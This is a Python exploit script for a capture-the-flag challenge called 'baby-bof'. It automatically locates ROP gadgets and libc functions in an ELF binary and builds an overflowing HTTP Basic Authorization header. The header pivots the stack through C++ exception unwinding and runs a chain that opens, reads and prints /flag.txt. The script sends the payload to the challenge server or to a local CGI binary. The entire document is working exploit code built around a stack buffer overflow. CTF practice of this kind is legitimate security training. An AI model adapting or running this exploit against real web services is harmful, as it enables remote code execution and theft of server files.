#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import pathlib
import re
import socket
import struct
import subprocess
import sys
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple

FLAG_RE = re.compile(rb"(?:grey|flag|ctf|nusgreyhats)\{[^}\r\n\x00]{1,200}\}", re.I)
OFF_SAVED_RBP = 0x110
OFF_SAVED_RIP = 0x118
OFF_ROP = 0x158


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


@dataclass
class Profile:
    pop_rdi: int
    pop_rsi: int
    pop_rdx_rbx: int
    open_addr: int
    read_addr: int
    write_addr: int
    exit_addr: int
    path_flag: int
    header: int
    bss: int
    fake_rbp: int
    unwind_rip: int


class ELF:
    def __init__(self, path: pathlib.Path):
        self.path = path
        self.data = path.read_bytes()
        if self.data[:4] != b"\x7fELF" or self.data[4] != 2 or self.data[5] != 1:
            raise ValueError(f"{path} is not a little-endian ELF64")
        self.phdrs = self._parse_phdrs()
        self.symbols = self._load_symbols()

    def _parse_phdrs(self):
        e_phoff = struct.unpack_from("<Q", self.data, 0x20)[0]
        e_phentsize = struct.unpack_from("<H", self.data, 0x36)[0]
        e_phnum = struct.unpack_from("<H", self.data, 0x38)[0]
        out = []
        for i in range(e_phnum):
            o = e_phoff + i * e_phentsize
            p_type, p_flags = struct.unpack_from("<II", self.data, o)
            p_offset, p_vaddr = struct.unpack_from("<QQ", self.data, o + 8)
            p_filesz = struct.unpack_from("<Q", self.data, o + 32)[0]
            out.append((p_type, p_flags, p_offset, p_vaddr, p_filesz))
        return out

    def _load_symbols(self) -> Dict[str, int]:
        res = subprocess.run(["nm", "-n", str(self.path)], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        syms: Dict[str, int] = {}
        for line in res.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and all(c in "0123456789abcdefABCDEF" for c in parts[0]):
                syms[parts[2]] = int(parts[0], 16)
        return syms

    def executable_ranges(self):
        for p_type, flags, p_off, p_va, p_size in self.phdrs:
            if p_type == 1 and (flags & 1):
                yield p_off, p_off + p_size, p_va

    def off_to_vaddr(self, off: int) -> int:
        for p_type, _flags, p_off, p_va, p_size in self.phdrs:
            if p_type == 1 and p_off <= off < p_off + p_size:
                return p_va + (off - p_off)
        raise ValueError(f"offset {off:#x} not mapped")

    def vaddr_to_off(self, va: int) -> int:
        for p_type, _flags, p_off, p_va, p_size in self.phdrs:
            if p_type == 1 and p_va <= va < p_va + p_size:
                return p_off + (va - p_va)
        raise ValueError(f"vaddr {va:#x} not mapped")

    def sym(self, *names: str) -> int:
        for name in names:
            if name in self.symbols:
                return self.symbols[name]
        raise KeyError(names)

    def find_vaddr(self, needle: bytes) -> int:
        off = self.data.find(needle)
        if off < 0:
            raise ValueError(f"missing {needle!r}")
        return self.off_to_vaddr(off)

    def find_gadget(self, needle: bytes) -> int:
        for start, end, va in self.executable_ranges():
            off = self.data.find(needle, start, end)
            if off >= 0:
                return va + off - start
        raise ValueError(f"missing gadget {needle.hex()}")

    def find_unwind_rip(self) -> int:
        # Same heuristic as the validated local exploit.
        pat = b"\x31\xd2\x48\x89\xee\xe8"
        suffix = b"\x48\x8b\x13\x48\x8d\x7a\xe8"
        ranges = []
        if "_ZNSs7reserveEm" in self.symbols:
            ranges.append((self.vaddr_to_off(self.symbols["_ZNSs7reserveEm"]), 0x200))
        for start, end, _va in self.executable_ranges():
            ranges.append((start, end - start))
        for start, size in ranges:
            blob = self.data[start:start + size]
            idx = 0
            while True:
                j = blob.find(pat, idx)
                if j < 0:
                    break
                ret_off = start + j + 10
                if self.data[ret_off:ret_off + len(suffix)] == suffix:
                    return self.off_to_vaddr(ret_off)
                idx = j + 1
        raise ValueError("could not auto-find unwind RIP")


def make_profile(elf_path: pathlib.Path) -> Profile:
    elf = ELF(elf_path)
    bss_start = elf.symbols.get("__bss_start", 0x4c0000)
    bss_end = elf.symbols.get("_end", bss_start + 0x8000)
    bss = (bss_start + min(0x4500, max(0x100, (bss_end - bss_start) // 2))) & ~0xF
    return Profile(
        pop_rdi=elf.find_gadget(b"\x5f\xc3"),
        pop_rsi=elf.find_gadget(b"\x5e\xc3"),
        pop_rdx_rbx=elf.find_gadget(b"\x5a\x5b\xc3"),
        open_addr=elf.sym("open", "__libc_open", "__open"),
        read_addr=elf.sym("read", "__libc_read", "__read"),
        write_addr=elf.sym("write", "__libc_write", "__write"),
        exit_addr=elf.sym("_exit"),
        path_flag=elf.find_vaddr(b"/flag.txt\x00"),
        header=elf.find_vaddr(b"Content-Type: text/plain\n"),
        bss=bss,
        fake_rbp=bss + 0x800,
        unwind_rip=elf.find_unwind_rip(),
    )


def build_rop(p: Profile) -> bytes:
    q: List[int] = []

    def write_fd1(addr: int, size: int):
        q.extend([p.pop_rdi, 1, p.pop_rsi, addr, p.pop_rdx_rbx, size, 0, p.write_addr])

    header_len = len(b"Content-Type: text/plain\n")
    write_fd1(p.header, header_len)
    write_fd1(p.header + header_len - 1, 1)  # second '\n' for CGI

    q.extend([p.pop_rdi, p.path_flag, p.pop_rsi, 0, p.open_addr])
    q.extend([p.pop_rdi, 3, p.pop_rsi, p.bss, p.pop_rdx_rbx, 0x80, 0, p.read_addr])
    q.extend([p.pop_rdi, 1, p.pop_rsi, p.bss, p.pop_rdx_rbx, 0x80, 0, p.write_addr])
    q.extend([p.pop_rdi, 0, p.exit_addr])
    return b"".join(p64(x) for x in q)


def build_auth(p: Profile) -> bytes:
    raw = bytearray(b"A" * OFF_ROP)
    raw += build_rop(p)
    raw[:6] = b"admin:"
    raw[OFF_SAVED_RBP:OFF_SAVED_RBP + 8] = p64(p.fake_rbp)
    raw[OFF_SAVED_RIP:OFF_SAVED_RIP + 8] = p64(p.unwind_rip)
    while len(raw) % 3:
        raw += b"P"
    return b"Basic " + base64.b64encode(raw) + b"@AAA"


def build_request(host: str, auth: bytes) -> bytes:
    return (
        b"GET / HTTP/1.1\r\n"
        + b"Host: " + host.encode() + b"\r\n"
        + b"User-Agent: baby-bof-final\r\n"
        + b"Authorization: " + auth + b"\r\n"
        + b"Connection: close\r\n\r\n"
    )


def send_http(host: str, port: int, auth: bytes, timeout: float) -> bytes:
    req = build_request(host, auth)
    out = bytearray()
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(req)
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            out += chunk
    return bytes(out)


def run_local(path: pathlib.Path, auth: bytes, timeout: float) -> bytes:
    env = {"REQUEST_METHOD": "GET", "HTTP_AUTHORIZATION": auth.decode()}
    res = subprocess.run([str(path)], env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)
    return res.stdout + (b"\n[stderr]\n" + res.stderr if res.stderr else b"")


def main() -> int:
    ap = argparse.ArgumentParser(description="Exploit baby-bof via C++ unwind pivot")
    ap.add_argument("host", nargs="?", default="challs.nusgreyhats.org")
    ap.add_argument("port", nargs="?", type=int, default=32367)
    ap.add_argument("--elf", default="./index.cgi", help="path to exact challenge binary")
    ap.add_argument("--local", action="store_true", help="run directly against local CGI via env")
    ap.add_argument("--timeout", type=float, default=5.0)
    ap.add_argument("--dump-auth", action="store_true")
    args = ap.parse_args()

    elf_path = pathlib.Path(args.elf)
    profile = make_profile(elf_path)
    auth = build_auth(profile)
    print('-'*0x30)
    print(auth)

    if args.dump_auth:
        sys.stdout.buffer.write(auth + b"\n")
        return 0

    if args.local:
        resp = run_local(elf_path, auth, args.timeout)
    else:
        resp = send_http(args.host, args.port, auth, args.timeout)

    m = FLAG_RE.search(resp)
    if m:
        print(m.group(0).decode(errors="replace"))
        return 0

    sys.stdout.buffer.write(resp)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
